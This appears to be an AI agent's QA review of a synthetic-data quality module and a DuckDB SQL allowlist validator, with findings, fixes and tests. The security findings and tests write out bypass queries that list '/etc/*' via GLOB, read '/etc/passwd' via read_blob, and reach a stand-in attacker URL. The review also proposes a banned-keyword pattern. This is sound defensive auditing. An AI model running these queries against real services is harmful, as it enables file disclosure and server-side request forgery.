# QA Review: quality/ module + data_discovery.py

**Date:** 2026-06-05  
**Reviewer:** QA agent  
**Branch:** qa/review-2026-06-05-quality-discovery  
**Scope:** `src/decoy_engine/quality/` (all 7 files) + `src/decoy_engine/data_discovery.py`  
**Excluded:** All files touched by prior QA branches (see branch listing). `errors.py` is noted briefly under Finding F9.

---

## 1. Summary

The quality module (D1a-D7c) is well-structured, correctly cites prior art (SDV, NIST SP 800-188, Gower 1971), and is genuinely deterministic across all five sub-modules reviewed. The single most important finding is in `data_discovery.py`: the SQL allowlist bans the major DuckDB file-reading *functions* but misses the `GLOB()` *table function*, leaving a filesystem directory-listing path open to any discovery query. The next most pressing issues are that view-registration errors in `data_discovery.py` escape as raw DuckDB exceptions (not `DiscoverySqlError`), and that `fetchmany(row_limit)` only limits Python-side materialization rather than actual DuckDB execution -- a full-scan still runs against large Parquet files. In the quality module itself, the DCR implementation's O(n_out * n_ref) matrix allocation is the sharpest operational risk under concurrent load.

---

## 2. Findings

### F1 - High | Security | data_discovery.py

**Issue:** DuckDB's `GLOB()` table function is not in `_BANNED` and is not caught by `_QUOTED_PATH_FROM_RE`.

```sql
-- This passes all three validators and lists /etc/ contents:
SELECT filename FROM GLOB('/etc/*');
```

`_QUOTED_PATH_FROM_RE` only matches `FROM '...'` (quoted string directly after FROM). `FROM GLOB('/etc/*')` has no quote immediately after FROM, so it passes. `_BANNED_RE` does not include `GLOB`. The allowlist for file-reading *functions* (`read_csv`, `read_parquet`, etc.) does not cover this DuckDB-specific table function.

**Impact:** Any discovery-query user can enumerate filesystem paths visible to the process. While this does not directly read file *contents*, it reveals deployment structure (directory names, Parquet file names, secrets-volume mount points) and is a meaningful information disclosure in a multi-tenant platform.

**Fix:** Add `GLOB` to `_BANNED` with a word-boundary match:

```python
_BANNED = (
    r"\b(INSERT|UPDATE|DELETE|MERGE|REPLACE|TRUNCATE|"
    r"CREATE|ALTER|DROP|ATTACH|DETACH|COPY|EXPORT|IMPORT|"
    r"PRAGMA|INSTALL|LOAD|SET|RESET|CHECKPOINT|VACUUM|CALL|"
    r"BEGIN|COMMIT|ROLLBACK|"
    r"read_csv|read_csv_auto|read_parquet|read_json|read_ndjson|"
    r"read_blob|read_text|GLOB)\b"  # <-- add read_blob, read_text, GLOB
)
```

Also add `read_blob` and `read_text` (DuckDB can read arbitrary binary/text files via these). Add a test:

```python
def test_glob_table_function_rejected():
    with pytest.raises(DiscoverySqlError, match="GLOB"):
        _validate_select_only("SELECT filename FROM GLOB('/etc/*')")
```

---

### F2 - Medium | Reliability | data_discovery.py

**Issue:** View-registration exceptions from `con.read_parquet(path).create_view(name, replace=True)` are not caught and do not become `DiscoverySqlError`.

```python
# data_discovery.py lines ~163-167
for name, path in tables.items():
    # If path doesn't exist or name is invalid for DuckDB,
    # raises raw duckdb.Error -- not caught here.
    con.read_parquet(path).create_view(name, replace=True)

try:
    rel = con.execute(sql)          # only THIS is guarded
except duckdb.Error as exc:
    raise DiscoverySqlError(...) from exc
```

**Impact:** A missing Parquet file, a DuckDB-invalid view name, or a corrupt Parquet header will surface as an untyped `duckdb.Error` (or `duckdb.IOException`) to the platform layer, not `DiscoverySqlError`. Platform callers that `except DiscoverySqlError` for user-visible error handling will miss this class of failures, letting the raw exception propagate (potentially including the file path in the message, which is an information disclosure).

**Fix:** Wrap view registration:

```python
for name, path in tables.items():
    try:
        con.read_parquet(path).create_view(name, replace=True)
    except duckdb.Error as exc:
        raise DiscoverySqlError(
            f"Failed to register table {name!r}: {type(exc).__name__}"
        ) from exc
```

Note: the `except` message deliberately omits the raw exception string, which may contain the filesystem path. Use `type(exc).__name__` for the operator and log the full path at DEBUG level separately.

---

### F3 - Medium | Performance | data_discovery.py

**Issue:** `fetchmany(row_limit)` limits Python-side result materialization, but the DuckDB query executes without any server-side row limit. A `SELECT * FROM big_parquet` still performs a full scan and materializes all rows in DuckDB's internal buffer before `fetchmany` pulls the cap.

```python
# line ~175
raw = rel.fetchmany(row_limit)   # Python receives only row_limit rows,
                                  # but DuckDB evaluated the entire query.
```

**Impact:** An 8M-row Parquet file with a wide schema could exhaust memory or cause multi-second stalls even though the user only sees 10,000 rows. The comment acknowledges the unbounded execution but frames it as acceptable. For the V2.0 platform (capped at 1M rows for quality pipeline) this is manageable but should be fixed before any increased row-count tier.

**Fix:** Use the DuckDB relational API to apply the limit before execution:

```python
try:
    rel = con.sql(sql).limit(row_limit)   # .limit() is a relational op, not SQL injection
    cols = [d[0] for d in rel.description]
    raw = rel.fetchall()
except duckdb.Error as exc:
    raise DiscoverySqlError(f"SQL execution failed: {exc}") from exc
```

`con.sql(sql)` parses and plans the query; `.limit(row_limit)` injects a relational `LIMIT` node before execution, so DuckDB stops scanning after `row_limit` rows. Verify: `con.sql("SELECT * FROM v").limit(3).fetchall()` returns 3 rows regardless of view size. Add a test with a 50k-row Parquet and confirm wall time drops proportionally.

---

### F4 - Medium | Performance | quality/synth_report.py (`_gower_min_distances`)

**Issue:** The DCR computation allocates an `(n_out, n_ref)` float64 matrix plus a same-sized intermediate per categorical column, iterating over all columns. At the default `sample_cap=5000`, peak allocation is ~400 MB per call (200 MB accumulator + 200 MB categorical broadcast).

```python
# synth_report.py
dist_sum = np.zeros((n_out, n_ref), dtype=float)   # 5000*5000*8 = 200 MB
...
ne = out_vals[:, None] != ref_vals[None, :]         # another 5000*5000 bool = 25 MB
dist_sum += ne.astype(float)                         # 5000*5000*8 = 200 MB temporary
```

**Impact:** Under concurrent DCR calls (e.g. multiple jobs reporting simultaneously), memory pressure multiplies linearly with concurrency. A platform with 4 concurrent quality pipelines would peak at ~1.6 GB just for DCR matrices. This is a CPU-bound bottleneck (the Python interpreter loops over columns) compounded by large intermediate allocations.

**Fix - near term:** Keep the chunked head() cap but reduce the default from 5000 to 2000. At 2000x2000 the accumulator is 32 MB, reducing concurrent pressure by 6x. Expose `sample_cap` as a tunable in the quality pipeline config.

**Fix - longer term:** Replace the dense `(n_out, n_ref)` accumulator with a chunked nearest-neighbour approach:

```python
# Process output in chunks of chunk_size; find the minimum across
# reference rows without holding the full matrix in memory.
chunk_size = 500
mins = np.full(n_out, np.inf)
for i in range(0, n_out, chunk_size):
    block = _gower_block(output.iloc[i:i+chunk_size], reference, cols, normalizer)
    mins[i:i+chunk_size] = block.min(axis=1)
return mins
```

This keeps peak memory to `chunk_size * n_ref * 8 bytes` = 500 * 5000 * 8 = 20 MB regardless of n_out.

**To verify:** Run `memory_profiler` on `compute_dcr(df_5k, df_5k, subset_columns=[...])` with 10 wide categorical columns. The peak allocation should confirm the estimate.

---

### F5 - Medium | Design | quality/policy.py

**Issue:** Every violation emitted by the policy checkers carries `"severity": "fail"`, but `_verdict_for` ignores per-violation severity entirely -- the final verdict depends only on `mode`, not on the violations' individual severity fields.

```python
# _check_overall, _check_marginal, etc. all do:
violations.append({..., "severity": "fail", ...})

# _verdict_for ignores it:
def _verdict_for(mode, violations):
    if not violations: return "pass"
    if mode == "report": return "pass"   # severity irrelevant
    if mode == "warn":   return "warn"   # severity irrelevant
    return "fail"                        # severity irrelevant
```

**Impact:** An operator reading a SynthReport sees `"severity": "fail"` on a per-column violation in `warn` mode and reasonably infers the job failed. It did not -- the verdict is `"warn"` because that is the mode. More practically, it makes the field useless for future per-violation routing (e.g. "minor column drift -> warn; diagnostic failure -> fail").

**Fix (minimal):** Respect per-violation severity in `_verdict_for` when mode is `"fail"`:

```python
def _verdict_for(mode: str, violations: list[dict[str, Any]]) -> str:
    if not violations:
        return "pass"
    if mode == "report":
        return "pass"
    # Severity fields are always "fail" today, but wire the routing
    # correctly so per-violation severity can be differentiated later.
    if mode == "warn":
        return "warn"
    # mode == "fail": promote to "fail" only if any violation is "fail".
    # "warn"-severity violations (once introduced) stay "warn" even in fail mode.
    severities = {v.get("severity", "fail") for v in violations}
    return "fail" if "fail" in severities else "warn"
```

Alternatively, if per-violation severity is intentionally always "fail" (simpler design), rename the field to `"status": "violated"` so it cannot be confused for routing weight. Document the choice in the policy module docstring.

---

### F6 - Low | Correctness | quality/snapshot.py

**Issue:** `_freetext_stats` uses bare `round(float(e))` (rounds to nearest integer) for `bin_edges`, while every other float in the snapshot uses `_round(float(e))` (rounds to `_FLOAT_PRECISION = 12` decimal places).

```python
# _freetext_stats, line ~198
bin_edges = [round(float(e)) for e in edges]   # nearest-int, NOT _round()

# _numeric_stats, line ~152 (correct):
bin_edges = [_round(float(e)) for e in edges]  # _FLOAT_PRECISION = 12
```

**Impact:** Freetext length bin edges are string-length integers (e.g. `[0, 12, 25, ...]`) so rounding to integer has no visible effect today. But if length histograms ever cover non-integer bin edges (e.g. after a refactor that fractionally subdivides bins), the inconsistency would silently produce lower-precision edges in freetext columns than in numeric columns. More importantly, it violates the stated contract: "Deterministic: `json.dumps(snapshot)` is byte-stable." If numpy's histogram edge arithmetic ever returns `24.999999999` for a length boundary, `round()` gives `25` while `_round()` gives `24.999999999` -- a different JSON representation.

**Fix:** One-line change:
```python
bin_edges = [_round(float(e)) for e in edges]   # was: round(float(e))
```

---

### F7 - Low | Security | data_discovery.py

**Issue:** `read_blob` and `read_text` (DuckDB file-reading functions) are not in `_BANNED`. Unlike `read_parquet` / `read_csv`, which were explicitly added by QA-2 (2026-05-31), `read_blob` was overlooked.

```sql
-- Reads raw bytes from any file the process can open:
SELECT * FROM read_blob('/etc/passwd');
```

The `_QUOTED_PATH_FROM_RE` guard does not catch `FROM read_blob(...)` because there is no quote immediately after `FROM`.

**Impact:** If DuckDB's `httpfs` extension is ever installed, `read_blob('http://attacker.com/')` could also exfiltrate the process's outbound network identity (SSRF oracle). Without httpfs it is still an arbitrary file read as the process user.

**Fix:** Covered by the fix in F1 -- add `read_blob|read_text` to `_BANNED_RE` in the same change.

---

### F8 - Low | Performance | quality/synth_report.py

**Issue:** `_row_hash_set` builds a Python `set` of all source row digests in memory. For the stated 1M-row cap, this is ~40 MB of SHA-1 hex strings (1M * 40 bytes + CPython set overhead ~= 80 MB). The iteration uses `itertuples`, which is a Python-level row-by-row loop and will take several seconds on a 1M-row frame.

```python
# O(N) Python loop; no vectorization:
for row in sub.itertuples(index=False, name=None):
    composite = "\x1f".join(str(v) for v in row)
    yield hashlib.sha1(composite.encode("utf-8"), usedforsecurity=False).hexdigest()
```

**Impact:** At 1M rows, rough estimate: `itertuples` + SHA-1 per row at ~500k rows/sec = ~2 seconds for source hashing, ~2 seconds for output iteration = ~4 seconds for `compute_new_row_synthesis`. Not a blocker at V2.0's 1M cap but worth knowing before raising the ceiling.

**Fix (near term):** The method is correct. Document the per-call time complexity and the 1M-row scaling expectation in the function docstring. No code change needed now; the future-tier note is already present.

**Fix (longer term if row cap rises):** Compute the composite string vectorized via pandas string concatenation, then hash the entire column of composite strings with a vectorized hash library (e.g. `xxhash` via `pd.DataFrame.apply` batches or a Cython extension). This is a 10-20x throughput gain over `itertuples` + Python SHA-1 but adds a dependency.

---

### F9 - Nit | Design | errors.py

**Issue:** `ValidationError` carries a multi-line docstring that references the previous module location (`decoy_engine.internal.validator`), the caller hierarchy, and migration history. Per the project comment rule ("explain why, not what; one line unless a real invariant needs more"):

```python
class ValidationError(Exception):
    """Lower-level validation failure raised by individual modular
    validators (``decoy_engine.graph.validators.*``).

    The public boundary catches this and re-wraps as
    :class:`PipelineValidationError` for the raise-on-first-error
    public API, or collects it into a ...

    Moved from ``decoy_engine.internal.validator`` to this public
    module in V2.0-C so platform/CLI callers stop importing from
    ``decoy_engine.internal.*``.
    """
```

The migration note ("Moved from internal.validator in V2.0-C") is task-reference commentary that belongs in the PR description, not the live docstring.

**Fix:** Trim to one line preserving the stable contract:

```python
class ValidationError(Exception):
    """Per-validator failure; public boundary re-wraps as PipelineValidationError."""
```

Same applies to `FKPreservationError` and `PKDuplicatesError` which have informative inline comments that duplicate what the field names convey.

---

## 3. Performance Notes

| Path | Bottleneck class | Complexity | Recommend |
|---|---|---|---|
| `data_discovery.py::run_discovery_sql` | I/O (DuckDB scan) | O(file_size) per query, unbounded | Apply `.limit()` at DuckDB relational layer (F3) |
| `synth_report.py::_gower_min_distances` | Memory + CPU | O(n_out * n_ref * cols) per call | Chunk to O(chunk_size * n_ref) (F4) |
| `synth_report.py::_row_hash_set` | CPU (Python loop) | O(N) at ~500k rows/sec | Acceptable at 1M cap; document limit (F8) |
| `snapshot.py::_joint_snapshot` | Memory | O(unique_a * unique_b) in pandas crosstab | Bounded by `_CATEGORICAL_DISTINCT_CAP=30`; at most 900 cells, acceptable |
| `snapshot.py::compute_distribution_snapshot` | CPU | O(N * cols) per call | Correct; no optimization needed at V2.0 row limits |

**Profiling commands:**
- DCR matrix: `python -m memory_profiler -s compute_dcr` with a 5000x5000 frame across 10 wide categorical columns.
- Row hashing throughput: `python -m timeit -n 3 'compute_new_row_synthesis(df_1m, df_1m)'` on a 1M-row frame; expect 4-8 seconds.
- DuckDB scan depth: compare `con.sql(sql).limit(N).fetchall()` vs `con.execute(sql).fetchmany(N)` wall time on a 1M-row Parquet via `timeit`.

---

## 4. Suggested Tests

| ID | Module | Case | Why |
|---|---|---|---|
| T1 | data_discovery.py | `_validate_select_only("SELECT filename FROM GLOB('/etc/*')")` raises `DiscoverySqlError` | F1 gap |
| T2 | data_discovery.py | `_validate_select_only("SELECT * FROM read_blob('/etc/passwd')")` raises | F7 gap |
| T3 | data_discovery.py | `run_discovery_sql(sql, {"t": "/nonexistent.parquet"})` raises `DiscoverySqlError`, not raw `duckdb.Error` | F2 gap |
| T4 | data_discovery.py | Query with 50k-row Parquet + `row_limit=100`: confirm wall time proportional to limit not file size | F3 performance regression test |
| T5 | synth_report.py | `compute_dcr` with `sample_cap=100` on frames with 10 wide string columns: peak RSS below 50 MB | F4 regression |
| T6 | synth_report.py | `compute_new_row_synthesis(source, exact_copy_of_source)` returns `fraction_new=0.0`, `band="low"` | Acceptance criterion in docstring |
| T7 | synth_report.py | `compute_new_row_synthesis(source, independent_sample)` returns `fraction_new` close to 1.0 | Acceptance criterion |
| T8 | quality/policy.py | `apply_quality_policy(report, {"mode": "warn", ...}, strategy_map=...)` with violations: `violations[0]["severity"]` should not be confused with verdict | F5 documentation/interface test |
| T9 | quality/snapshot.py | `compute_distribution_snapshot(df_with_inf_col)` succeeds and freetext/numeric stats contain no `Inf` or `NaN` | JSON-serializable contract |
| T10 | quality/snapshot.py | Snapshot of a frame computed twice (same seed, same columns) produces byte-identical `json.dumps` output | Determinism regression |
| T11 | quality/fidelity.py | `compute_fidelity(snap_a, snap_b)` is symmetric: swap source/output, overall_score unchanged | Symmetry property stated in docstring |
| T12 | quality/report.py | `compute_quality_report(df, df, now_iso="2026-01-01T00:00:00+00:00")` produces byte-identical JSON on two calls | Determinism with pinned timestamp |

---

## 5. What's Good

- **Determinism is correctly implemented throughout.** `_categorical_stats` sorts by `(-count, value)`, datetime stats sort by year index, joint cells sort by `(-count, key[0], key[1])`, and all set/dict operations on column names use `sorted()`. No hidden nondeterminism found.

- **The `_validate_select_only` layered defence in `data_discovery.py` is solid.** Leading-keyword allowlist + banned-keyword scan + quoted-path-FROM scan correctly handles comment-prefixed statements, trailing semicolons, and the specific `FROM '/path'` DuckDB gap from QA-2 (2026-05-31). F1/F7 are incremental gaps, not a broken design.

- **`compute_attack_metrics` opt-in design is correct and safe.** Double-gating on `enable_attacks=True` AND the extras package being importable means attack metrics cannot run by accident. The `_attacks_unavailable` path is the default for every production call that doesn't explicitly opt in, and the disclaimer wiring in `assemble_synth_report` correctly distinguishes "no attack attempted" from "attack ran and passed".

- **The `_round` / `_FLOAT_PRECISION` pinning pattern in snapshot.py is exactly right.** Rounding BLAS-variant floats to 12 places at the snapshot boundary rather than at the fidelity scorer lets the scorer receive already-rounded inputs, making the JSON output byte-stable across BLAS builds without losing score resolution.

- **`_gower_min_distances` correctly normalizes against source range only.** The comment explains why: normalizing against the output or holdout range would let outliers in either frame skew the distance metric. This is the correct Gower implementation for memorization testing.

- **`assemble_synth_report`'s disclaimer logic is precise.** The `_attack_actually_attempted` check correctly identifies the case where an `_attacks_unavailable` dict was passed (available=False) and appends the disclaimer, while suppressing it only when attack results are actually present. The 2026-06-01 QA-10 F13 refinement is correctly applied.

- **`errors.py` exception hierarchy is clean and useful.** `FlagPauseSignal` is correctly documented as a control-flow signal (not a runtime error) with the `# noqa: N818` justification. `PKDuplicatesError.code` as a class attribute is a nice touch for routing without instance inspection.
